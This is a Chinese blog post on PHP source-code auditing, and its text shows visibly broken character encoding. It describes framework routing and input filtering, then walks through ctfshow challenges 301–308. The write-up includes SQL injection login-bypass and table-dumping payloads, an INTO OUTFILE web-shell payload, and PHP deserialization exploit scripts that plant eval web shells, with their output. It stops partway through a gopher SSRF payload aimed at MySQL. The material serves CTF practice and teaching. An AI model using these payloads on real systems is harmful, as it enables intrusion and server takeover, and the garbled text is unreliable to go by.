è‡ªåŠ¨ç”Ÿæˆå®šä¹‰æ–‡ä»¶ï¼ˆå‚è€ƒï¼‰â”œâ”€composer.json         composer å®šä¹‰æ–‡ä»¶â”œâ”€LICENSE.txt           æˆæƒè¯´æ˜æ–‡ä»¶â”œâ”€README.md             README æ–‡ä»¶â”œâ”€think                 å‘½ä»¤è¡Œå…¥å£æ–‡ä»¶\n\nå…¶ä¸­, applicationç›®å½•å’Œpublicç›®å½•æ˜¯åº”ç”¨ç¨‹åºæ–‡ä»¶ç›®å½•å’Œè¿è¡Œæ•°æ®å­˜æ”¾ç›®å½•, å±äºé‡ç‚¹å…³æ³¨å¯¹è±¡\nåŒæ—¶, applicationç›®å½•ä¸‹çš„config.php/databse.php/route.phpåˆ†åˆ«æ˜¯ç³»ç»Ÿé…ç½®æ–‡ä»¶/æ•°æ®åº“æ“ä½œæ–‡ä»¶/ç³»ç»Ÿè·¯ç”±æ–‡ä»¶; éƒ½è¦ä»”ç»†åˆ†æ\nå¯¹äºThinkPHPæ¡†æ¶å¼€å‘çš„åº”ç”¨ï¼Œå…¶è®¿é—®ç³»ç»Ÿçš„URLé€šå¸¸æ˜¯è¿™æ ·çš„ï¼š/index.php/æ¨¡å—å/æ§åˆ¶å™¨å/å‡½æ•°å/[å‚æ•°å/å‚æ•°å€¼]\nå…¶ä¸­æ¨¡å—åå¯¹åº”äº†applicationç›®å½•ä¸‹çš„æ–‡ä»¶å¤¹çš„åå­—ã€‚æ§åˆ¶å™¨åå¯¹åº”äº†æ¨¡å—åç›®å½•ä¸‹çš„controlleræ–‡ä»¶å¤¹ä¸‹çš„phpæ–‡ä»¶åã€‚å‚æ•°åˆ™æ˜¯å¯é€‰çš„ï¼Œå¯ä»¥æŒ‰ç…§/å‚æ•°å/å‚æ•°å€¼çš„æ–¹å¼åŒæ—¶ä¼ å…¥å¤šä¸ªå‚æ•°ï¼Œä¹Ÿå¯ä»¥æŒ‰ç…§ä¼ ç»Ÿæ–¹å¼ä½¿ç”¨?å‚æ•°1=å‚æ•°å€¼1&amp;å‚æ•°2=å‚æ•°å€¼2çš„æ–¹å¼ä¼ å…¥å˜é‡ã€‚\nlaravelåŸºæœ¬ç›®å½•ç»“æ„:\n|â€”â€”app  åŒ…å«äº†ç«™ç‚¹çš„controllersï¼ˆæ§åˆ¶å™¨ï¼‰ï¼Œmodelsï¼ˆæ¨¡å‹ï¼‰ï¼Œviewsï¼ˆè§†å›¾ï¼‰å’Œassetsï¼ˆèµ„æº|â€”â€”bootstrap å­˜æ”¾ç³»ç»Ÿå¯åŠ¨æ—¶çš„å¿…è¦æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¼šè¢«index.phpè¿™æ ·çš„æ–‡ä»¶è°ƒç”¨ã€‚|â€”â€”public ç³»ç»Ÿè¿è¡Œçš„å…¬å¼€æ•°æ®ï¼ŒåŒ…æ‹¬é™æ€èµ„CSSæ–‡ä»¶ã€jsæ–‡ä»¶ç­‰|â€”â€”vender ç¬¬ä¸‰æ–¹ç±»åº“\n\nä¸»è¦åº”ç”¨ç¨‹åºæ”¾åœ¨äº†appç›®å½•ä¸‹\næ²¡æœ‰ä½¿ç”¨å¼€å‘æ¡†æ¶åœ¨æ²¡æœ‰ä½¿ç”¨å¼€å‘æ¡†æ¶çš„æƒ…å†µä¸‹, æˆ‘ä»¬éœ€è¦åˆ¤æ–­åº”ç”¨ç¨‹åºæ˜¯å¦é‡‡ç”¨äº†mvcæ¨¡å¼, å¦‚æœæœ‰çš„è¯, éœ€è¦æŸ¥çœ‹ç³»ç»Ÿçš„è·¯ç”±æ–‡ä»¶, çœ‹çœ‹æ§åˆ¶ç¨‹åºæ˜¯å¦‚ä½•é€šè¿‡è·¯ç”±å®šä½çš„. æ¯”å¦‚PHPCMS, å°±æ˜¯åˆ©ç”¨äº†è‡ªå·±å¼€å‘å‡ºæ¥çš„mvcæ§åˆ¶å™¨è¿›è¡Œè·¯ç”±\nè®¿é—®index.php, å¯ä»¥çœ‹åˆ°åŒ…å«äº†phpcms/base.php\ndefine(&#x27;PHPCMS_PATH&#x27;, dirname(__FILE__).DIRECTORY_SEPARATOR);include PHPCMS_PATH.&#x27;/phpcms/base.php&#x27;;\n\nè¿›å…¥base.phpæ–‡ä»¶, å°±èƒ½çœ‹åˆ°, è¿™é‡Œå®šä¹‰äº†ç‰¹åˆ«å¤šçš„è·¯ç”±ä»¥åŠåˆå§‹åŒ–çš„ä¸€äº›ç±»ä»¥åŠæ–¹æ³•\n//PHPCMSæ¡†æ¶è·¯å¾„define(&#x27;PC_PATH&#x27;, dirname(__FILE__).DIRECTORY_SEPARATOR);if(!defined(&#x27;PHPCMS_PATH&#x27;)) define(&#x27;PHPCMS_PATH&#x27;, PC_PATH.&#x27;..&#x27;.DIRECTORY_SEPARATOR);//ç¼“å­˜æ–‡ä»¶å¤¹åœ°å€define(&#x27;CACHE_PATH&#x27;, PHPCMS_PATH.&#x27;caches&#x27;.DIRECTORY_SEPARATOR);//ä¸»æœºåè®®define(&#x27;SITE_PROTOCOL&#x27;, isset($_SERVER[&#x27;SERVER_PORT&#x27;]) &amp;&amp; $_SERVER[&#x27;SERVER_PORT&#x27;] == &#x27;443&#x27; ? &#x27;https://&#x27; : &#x27;http://&#x27;);//å½“å‰è®¿é—®çš„ä¸»æœºådefine(&#x27;SITE_URL&#x27;, (isset($_SERVER[&#x27;HTTP_HOST&#x27;]) ? $_SERVER[&#x27;HTTP_HOST&#x27;] : &#x27;&#x27;));//æ¥æºdefine(&#x27;HTTP_REFERER&#x27;, isset($_SERVER[&#x27;HTTP_REFERER&#x27;]) ? $_SERVER[&#x27;HTTP_REFERER&#x27;] : &#x27;&#x27;);//å®šä¹‰ç½‘ç«™æ ¹è·¯å¾„define(&#x27;WEB_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;web_path&#x27;));//js è·¯å¾„define(&#x27;JS_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;js_path&#x27;));//css è·¯å¾„define(&#x27;CSS_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;css_path&#x27;));//img è·¯å¾„define(&#x27;IMG_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;img_path&#x27;));//åŠ¨æ€ç¨‹åºè·¯å¾„define(&#x27;APP_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;app_path&#x27;));//åº”ç”¨é™æ€æ–‡ä»¶è·¯å¾„define(&#x27;PLUGIN_STATICS_PATH&#x27;,WEB_PATH.&#x27;statics/plugin/&#x27;);class pc_base &#123;  ......&#125;\n\nå¯¹äºæ²¡æœ‰ä½¿ç”¨æ¡†æ¶, ä¹Ÿæ²¡æœ‰ä½¿ç”¨è‡ªå®šä¹‰çš„mvcæ¨¡å‹çš„ç¨‹åº, å°±åªéœ€è¦æŒ‰ç…§ä¼ ç»Ÿçš„è„šæœ¬æ ¼å¼çš„è®¿é—®æ–¹å¼å°±è¡Œ, ä»¥index.phpä½œä¸ºåˆ‡å…¥ç‚¹, ä¾æ¬¡åˆ†æç›¸å…³æºç å³å¯\nå‚æ•°è¿‡æ»¤åˆ†æä¼ ç»Ÿå‚æ•°è¿‡æ»¤åˆ†æ, é€šå¸¸ä¼šä»¥å‡½æ•°çš„æ–¹å¼è¿›è¡Œè¿‡æ»¤, ä½†æ˜¯æŸäº›ç³»ç»Ÿä¹Ÿå¯èƒ½ä¼šåœ¨å‚æ•°ä¼ å…¥å, è¿›è¡Œå…¨å±€å‚æ•°è¿‡æ»¤, æ‰€ä»¥æˆ‘ä»¬åœ¨å®¡è®¡ä¹‹å‰, å°±éœ€è¦å…ˆäº†è§£åº”ç”¨ç¨‹åºé‡‡ç”¨äº†å“ªäº›è¿‡æ»¤æ–¹æ³•, æ˜¯å¦ä½¿ç”¨äº†å…¨å±€å‚æ•°è¿‡æ»¤\nmvcæ¨¡å¼ä¸‹çš„è¿‡æ»¤æƒ…å†µåˆ†æé¦–å…ˆä»¥tpæ¥è¯´, è·å–å‚æ•°çš„æ–¹å¼æœ‰ä¸¤ç§, ä¸€æ˜¯é€šè¿‡åŸç”Ÿçš„$_GETç­‰æ–¹å¼è·å–å‚æ•°, äºŒæ˜¯é€šè¿‡$Request()å¯¹è±¡è·å–å‚æ•°. åœ¨å®¡è®¡think PHPç¨‹åºçš„æ—¶å€™,å°±éœ€è¦å¯¹è¿™ä¸¤ç§å‚æ•°è¿›è¡Œå®¡è®¡\nåœ¨tpä¸­, ä¼šåœ¨configæ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªé»˜è®¤çš„å…¨å±€è¿‡æ»¤å™¨\n// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª&#x27;default_filter&#x27;         =&gt; &#x27;&#x27;,\n\næ¯”å¦‚åƒä¸Šé¢è¿™æ ·, é»˜è®¤çš„è¿‡æ»¤å™¨ä¸ºç©º, ä¹Ÿå°±æ˜¯è¯´åœ¨ä½¿ç”¨$_GETç­‰åŸå§‹æ–¹æ³•è·å–å‚æ•°çš„æ—¶å€™, å°±æ˜¯ä¸ä¼šè¿›è¡Œè¿‡æ»¤çš„\nç„¶åå†æ¥çœ‹çœ‹$Requestå¯¹è±¡è·å–å‚æ•°æ—¶æ˜¯å¦‚ä½•è¿›è¡Œçš„, æ¯”å¦‚requestå¯¹è±¡çš„getæ–¹æ³•, æ˜¯ç”¨äºè·å–GETæ–¹å¼ä¼ å…¥çš„å‚æ•°çš„\npublic function get($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)    &#123;        if (empty($this-&gt;get)) &#123;            $this-&gt;get = $_GET;        &#125;        if (is_array($name)) &#123;            $this-&gt;param      = [];            return $this-&gt;get = array_merge($this-&gt;get, $name);        &#125;        return $this-&gt;input($this-&gt;get, $name, $default, $filter);    &#125;\n\nå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸‰ä¸ªå½¢å‚ï¼Œåˆ†åˆ«æ˜¯nameã€defaultã€filterã€‚å…¶ä¸­nameæ˜¯æˆ‘ä»¬è¦è·å–çš„å˜é‡åï¼Œè€Œfileteråˆ™æ˜¯æˆ‘ä»¬è¦æ˜¯ç”¨çš„è¿‡æ»¤å™¨ï¼Œè¿™é‡Œé»˜è®¤ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯ä¸è¿›è¡Œä»»ä½•è¿‡æ»¤ã€‚\næ‰€ä»¥åœ¨è¿›è¡Œå®¡è®¡çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†é»˜è®¤çš„å…¨å±€è¿‡æ»¤é€‰é¡¹ï¼Œæˆ–è€…è¯´æ˜¯å¦åœ¨è·å–å‚æ•°çš„æ—¶å€™ï¼Œè®¾ç½®äº†æ–°çš„è¿‡æ»¤å™¨ã€‚\nåŸç”Ÿphpæ¨¡å¼ä¸‹çš„è¿‡æ»¤åˆ†æå¯¹äºåŸç”Ÿçš„phpå¼€å‘çš„åº”ç”¨ç¨‹åº, å¾€å¾€æ˜¯é€šè¿‡å‡½æ•°çš„æ–¹å¼æ¥è®¾ç½®è¿‡æ»¤è§„åˆ™, æ‰€ä»¥å°±éœ€è¦åœ¨å‚æ•°è·å–çš„åœ°æ–¹æ¥çœ‹çœ‹, æ˜¯å¦è°ƒç”¨äº†å‚æ•°è¿‡æ»¤å‡½æ•°æ¥è¿›è¡Œè¿‡æ»¤æ¥è¿›è¡Œè¿‡æ»¤, å¹¶åˆ¤æ–­æ˜¯å¦æ˜¯æœ‰æ•ˆè¿‡æ»¤\nè¿™é‡Œä»¥å¸å›½CMSä¸ºä¾‹, è¿›è¡Œä¸€ä¸ªç®€å•çš„åˆ†æ. å¸å›½cmsçš„è¿‡æ»¤å‡½æ•°åœ¨e/class/connect.phpä¸­, å®šä¹‰äº†ä¸‰ä¸ªå‚æ•°å¤„ç†å‡½æ•°, è¿™é‡Œä»¥å…¶ä¸­ä¸€ä¸ªä¸ºä¾‹, è¿›è¡Œåˆ†æ:\n//å‚æ•°å¤„ç†å‡½æ•°function RepPostVar($val)&#123;\tif($val!=addslashes($val))\t&#123;\t\texit();\t&#125;\tCkPostStrChar($val);\t$val=str_replace(&quot;%&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot; &quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;`&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;\\t&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;%20&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;%27&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;*&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;&#x27;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;\\&quot;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;/&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;#&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;--&quot;,&quot;&quot;,$val);\t$val=RepPostStr($val,1);\t$val=addslashes($val);\t//FireWall\tFWClearGetText($val);\treturn $val;&#125;\n\nå¯è§, è¿™é‡Œå¯¹% ç©ºæ ¼ `  %20 %27 * â€˜ \\ / ; # â€“è¿›è¡Œäº†è¿‡æ»¤\nç„¶åæˆ‘ä»¬å¯ä»¥å…·ä½“åˆ°æ–‡ä»¶ä¸­, çœ‹çœ‹ä¼ å…¥çš„å‚æ•°æ˜¯å¦éƒ½è°ƒç”¨äº†è¯¥å‡½æ•°è¿›è¡Œè¿‡æ»¤, æ¯”å¦‚è¿™é‡Œ\n//å®¡æ ¸è¯„è®º&#123;\t$plid=$_POST[&#x27;plid&#x27;];\t$id=$_POST[&#x27;id&#x27;];\t$bclassid=$_POST[&#x27;bclassid&#x27;];\t$classid=$_POST[&#x27;classid&#x27;];\tCheckPl_all($plid,$id,$bclassid,$classid,$logininid,$loginin);&#125;function CheckPl_all($plid,$id,$bclassid,$classid,$userid,$username)&#123;\tglobal $empire,$class_r,$dbtbpre,$public_r;\t//éªŒè¯æƒé™\t$restb=(int)$_POST[&#x27;restb&#x27;];\t$count=count($plid);\tif(empty($count)||!$restb)&#123;\t\tprinterror(&quot;NotCheckPlid&quot;,&quot;history.go(-1)&quot;);\t&#125;\tif(!strstr($public_r[&#x27;pldatatbs&#x27;],&#x27;,&#x27;.$restb.&#x27;,&#x27;))&#123;\t\tprinterror(&quot;NotCheckPlid&quot;,&quot;history.go(-1)&quot;);\t&#125;\t$add=&#x27;&#x27;;\t$docheck=(int)$_POST[&#x27;docheck&#x27;];\t$docheck=$docheck?1:0;\tfor($i=0;$i&lt;$count;$i++)&#123;\t\t$add.=&quot;plid=&#x27;&quot;.intval($plid[$i]).&quot;&#x27; or &quot;;\t&#125;\t$add=substr($add,0,strlen($add)-4);\t$sql=$empire-&gt;query(&quot;update &#123;$dbtbpre&#125;enewspl_&#123;$restb&#125; set checked=&#x27;$docheck&#x27; where &quot;.$add);\tif($sql)\t&#123;\t\t....  &#125;&#125;\n\næ¯”å¦‚è¿™é‡Œ, åå°è¯„è®ºç®¡ç†çš„åœ°æ–¹, è·å–äº†è¯„è®ºå’ŒIDç­‰å‚æ•°, åœ¨æœªç»è¿‡æ»¤çš„æƒ…å†µä¸‹, ä¼ å…¥äº†CheckPl_all()å‡½æ•°, å¯è§è¿™é‡Œçš„å‚æ•°éƒ½æ²¡æœ‰è°ƒç”¨è¿‡æ»¤å‡½æ•°è¿›è¡Œå¤„ç†, ä½†æ˜¯å¥½åœ¨éƒ½å¯¹è¿™äº›å‚æ•°ä½¿ç”¨äº†intç±»å‹å¼ºåˆ¶ç±»å‹è½¬æ¢; æ‰€ä»¥æ¯”è¾ƒå®‰å…¨\nç„¶åæˆ‘ä»¬å¼€å§‹åˆ·ä¸€ä¸‹ctfshowçš„é¢˜ç›®301-310\nåšå‡ ä¸ªé¢˜301æ˜ å…¥çœ¼å¸˜ä¸€ä¸ªç™»é™†æ¡†, çŒœæµ‹å­˜åœ¨SQLæ³¨å…¥\næœç„¶, æ¯«æ— è¿‡æ»¤çš„ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´, ç„¶åè¿™é‡Œç¬¬äºŒä¸ªifåˆ¤æ–­\nif(!strcasecmp($userpwd,$row[&#x27;sds_password&#x27;]))&#123;\t$_SESSION[&#x27;login&#x27;]=1;\t$result-&gt;free();\t$mysqli-&gt;close();\theader(&quot;location:index.php&quot;);\treturn;&#125;\n\næ£€æŸ¥$userpwdå˜é‡æ˜¯å¦ä¸$row[&#39;sds_password&#39;]å˜é‡ç›¸ç­‰, å¦‚æœç›¸ç­‰, åˆ™è®¾ç½®ä¸€ä¸ªåä¸º$_SESSION[&#39;login&#39;]çš„sessionå˜é‡ä¸º1\nä»£ç ç¬¬ä¸€è¡Œä½¿ç”¨strcasecmp()å‡½æ•°æ¯”è¾ƒ$userpwd , $row[&#39;sds_passwordä¸¤ä¸ªå˜é‡, è¯¥å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªæ•´æ•°, è¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²çš„ç›¸å¯¹å¤§å°. å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸åŒåˆ™ä¼šè¿”å›0, ç»§ç»­æ‰§è¡Œ$_SESSION[&#39;login&#39;]=1;å¹¶é‡Šæ”¾æŸ¥è¯¢ç»“æœ $resultï¼Œå…³é—­ MySQL æ•°æ®åº“è¿æ¥ $mysqliï¼Œç„¶åå°†é¡µé¢é‡å®šå‘åˆ° index.php\nè¿™é‡Œæˆ‘ä»¬payloadæ˜¯:\n1&#x27; union select 1;#1\n\nè¿™æ ·æˆ‘ä»¬æŸ¥è¯¢çš„ç»“æœå°±æ˜¯1, ç„¶åå¯†ç ä¹Ÿè®¾ä¸º1å³å¯, å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯2\n\nå³å¯ç™»å½•æˆåŠŸ, æ‹¿åˆ°flag\n302è¿™é¢˜å°±åªæ˜¯ä¿®æ”¹äº†ä¸€ä¸ªåœ°æ–¹è€Œå·²\n\nå¤šäº†ä¸€ä¸ªåŠ å¯†æ–¹æ³•, å°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿›è¡Œäº†ä¸€ä¸ªè§£ç , é‚£ä¹ˆæˆ‘ä»¬äººå·¥å°†å·²ç»è§£ç çš„sds_passwordè¾“å…¥è¿›å», é‚£ä¹ˆä¸¤ä¸ªå˜é‡è¿˜æ˜¯ç›¸ç­‰çš„, å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†è¾“å…¥çš„userowdç¼–ç ä¸€ä¸‹å†è¾“å…¥è¿›å», ä½†æ˜¯é‚£æ ·æ˜¯é€†å‘çš„å¾ˆæ˜æ˜¾è¦å¤æ‚å¾ˆå¤š\næˆ‘ä»¬æŒ‰ä½CTRLé¼ æ ‡å·¦é”®ç‚¹ä¸€ä¸‹sds_decodeå‡½æ•°, å°±èƒ½çœ‹è§è§£ç å‡½æ•°fun.php\n\nè¿™ä¸ªè„šæœ¬ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„exp:\n&lt;?php$str = 2;echo md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);?&gt;\n\næœ€ç»ˆpayload\n2&#x27; union select &#x27;f977952c679ca39837adaba7778c288b&#x27;;#2\n\nå†™å…¥ä¸€å¥è¯æœ¨é©¬è¿™ä¸¤é¢˜éƒ½å¯ä»¥é‡‡ç”¨å†™å…¥ä¸€å¥è¯æœ¨é©¬çš„æ–¹æ³•è§£å†³, è¿™æ ·å°±å¯ä»¥æ— è§†phpçš„é€»è¾‘, ç›´æ¥å†™å…¥\nè¿™é‡Œç›´æ¥æ”¾payload\nuserid=1&#x27; union select &quot;&lt;?php eval($_POST[1]); ?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;%23&amp;userpwd=1\n\n\nç„¶åæˆ‘ä»¬ç›´æ¥è®¿é—®1.php, ç„¶åå°±æ‹¿åˆ°shelläº†\n\n303è¿™é¢˜åˆå¢åŠ äº†é™åˆ¶, é™åˆ¶ç”¨æˆ·åé•¿åº¦å°äº6\né‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰çš„æ–¹æ³•å°±ä¸é€‚ç”¨äº†\næˆ‘ä»¬ç»§ç»­çœ‹ä¸‹é¢çš„æ–‡ä»¶, åˆ°äº†è¿™ä¸ªdptadd.php, å†æ¬¡å‘ç°SQLè¯­å¥, æ˜¯insert\nä½†æ˜¯è¿™ä¸ªphpæ–‡ä»¶, æˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®, éœ€è¦ç™»å½•åæ‰å¯ä»¥, è¿™é‡Œæœ‰ä¸€ä¸ªsqlæ–‡ä»¶, æˆ‘ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹, å‘ç°äº†ç‰¹åˆ«åƒå¯†ç çš„ä¸œè¥¿.\n ä½†æ˜¯æ ¹æ®ä¸Šä¸€é¢˜ç»éªŒ, è¿™é‡Œçš„å¯†ç ä¹Ÿåº”è¯¥æ˜¯ç¼–ç è¿‡çš„, æˆ‘ä»¬å†å»fun.phpçœ‹ä¸€ä¸‹, è¿è¡Œåˆšå¥½æ˜¯é‚£ä¸²å­—ç¬¦ä¸²\né‚£ä¹ˆè´¦å·å¯†ç å°±åº”è¯¥æ˜¯admin,admin; å½“ç„¶è¿™é‡Œçˆ†ç ´å¼±å£ä»¤ä¼¼ä¹ä¹Ÿæ˜¯å¯ä»¥çš„\nè¿™é‡Œç›´æ¥è´´ä¸€ä¸‹payload\ndpt_name=123&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123dpt_name=123&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123dpt_name=123&#x27;,sds_address=(select flag from sds_fl9g)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123\n\næˆ‘ä»¬åªéœ€è¦æŠ“ä¸€ä¸ªdptadd.phpçš„åŒ…\n\næœ€ç»ˆçš„æŸ¥è¯¢ç»“æœå°±å¯ä»¥åœ¨dpt.phpç•Œé¢æ˜¾ç¤ºå‡ºæ¥\n304å¢åŠ äº†å…¨å±€waf\nfunction sds_waf($str)&#123;\treturn preg_match(&#x27;/[0-9]|[a-z]|-/i&#x27;, $str);&#125;\n\nä½†æ˜¯å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨,  è²Œä¼¼æ˜¯æºä»£ç é‡Œæ²¡æœ‰ç”¨ä¸Šwaf, æˆ‘ä»¬ç»§ç»­è¯•ä¸€ä¸‹ä¸Šé¢˜çš„payload,\n\nè¿™é‡Œåªæ˜¯æ¢äº†ä¸ªè¡¨å, ä½†æ˜¯payloadä»ç„¶é€‚ç”¨\n305è¿™é‡Œä»‹ç»ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„å·¥å…·, seayæºç å®¡è®¡ç³»ç»Ÿ\næˆ‘ä»¬æŠŠæ–‡ä»¶å¤¹åœ¨é‡Œè¾¹æ‰“å¼€ç›´æ¥ç‚¹å‡»è‡ªåŠ¨å®¡è®¡å³å¯\næˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªsqlæ³¨å…¥, ä¼šå‘ç°è¿™é‡Œå¥—äº†waf, é‚£å¾ˆæ˜æ˜¾å‰é¢çš„SQLæ³¨å…¥å°±ä¸èƒ½ç”¨äº†\né‚£ä¹ˆæˆ‘ä»¬å°è¯•åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªååºåˆ—åŒ–æ¼æ´\n\nè¿™é‡Œæœ‰ä¸ªfile_put_contents, é‚£ä¹ˆååºåˆ—åŒ–å…¥å£ç‚¹åœ¨å“ªå‘¢, æˆ‘ä»¬å¯ä»¥æœä¸€ä¸‹userè¯•è¯•\n\nå¯ä»¥çœ‹å‡ºcookie æ˜¯ååºåˆ—åŒ–å…¥å£, æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬è¯•ä¸€è¯•\nexp:\n&lt;?phpclass user&#123;    public $username;    public $password;    public function __construct()&#123;        $this-&gt;username=&#x27;1.php&#x27;;        $this-&gt;password=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;    &#125;&#125;$a = new user();echo urlencode(serialize($a));?&gt;\n\nè¿è¡Œå¾—åˆ°ç»“æœ\nO%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D\n\nè¿™é‡Œè¿˜æ˜¯éœ€è¦æˆ‘ä»¬ç™»å½•åæ‰èƒ½åˆ©ç”¨çš„, æ‰€ä»¥æˆ‘ä»¬è¦é¦–å…ˆåˆ©ç”¨å¼±å£ä»¤ç™»å½•, ç„¶åè®¿é—®checklogin.phpé€šè¿‡cookieå‘åŒ…\n\nè¿èšå‰‘å¹¶æ²¡æœ‰å‘ç°flag, ä½†æ˜¯å­˜åœ¨æ•°æ®åº“, æˆ‘ä»¬çŒœæµ‹flagåœ¨æ•°æ®åº“é‡Œ\n306æ‰«ä¸€ä¸‹, åˆåœ¨class.phpé‡Œå‘ç°äº†æ¼æ´\n\nç„¶åæˆ‘ä»¬å†æ‰¾ä¸€ä¸‹close(), ç„¶ååœ¨dao.phpä¸­æ‰¾åˆ°äº†\næˆ‘ä»¬æ„é€ ä¸€ä¸‹exp.php\n\n&lt;?phpclass dao&#123;    private $conn;    public function __construct()    &#123;        $this-&gt;conn=new log();    &#125;&#125;class log&#123;    public $title=&#x27;1.php&#x27;;    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));\n\næ‰§è¡Œexpç»“æœ:\nTzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319\n\nè®¿é—®index.phpå¹¶æ·»åŠ usercookie\n\nå†™å…¥æœ¨é©¬æ–‡ä»¶1.php\n307ç”¨å·¥å…·æ‰«ä¸€ä¸‹, æ‰«å‡ºshell_execå¯èƒ½å­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´\nè¿™é‡Œå…ˆæ‰¾ä¸€ä¸‹clearCache, å¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹, åœ¨logout.phpä¸­, å‘ç°äº†å¯åˆ©ç”¨ç‚¹\nå†çœ‹ä¸€ä¸‹cache_dir, åœ¨configç±»é‡Œ\nè¿™æ¬¡æˆ‘ä»¬ä»logout.phpå†™servicecookie, å†™å…¥ä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶\nè®¿é—®http://url/controller/1.php\n\n308ä¸Šé¢˜åˆ©ç”¨çš„æ¼æ´å·²ç»è¢«ä¿®å¤äº†, ä½†æ˜¯fun.phpé‡Œå¤šäº†ä¸€ä¸ªssrfåˆ©ç”¨ç‚¹\nåœ¨dao.phpä¸­å‘ç°è¢«è°ƒç”¨\nåˆåœ¨index.phpä¸­æ‰¾åˆ°åˆ©ç”¨ç‚¹\nç„¶åæˆ‘ä»¬å‘ç°æ•°æ®åº“å¯†ç ä¸ºç©º, è¿™é‡Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ä½¿ç”¨gopheræ‰“MySQL\nåˆ©ç”¨gopherusç”Ÿæˆï¼Œåœ°å€https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)\nå¯ä»¥æ„é€ å‡ºæœ€ç»ˆexp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url=&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f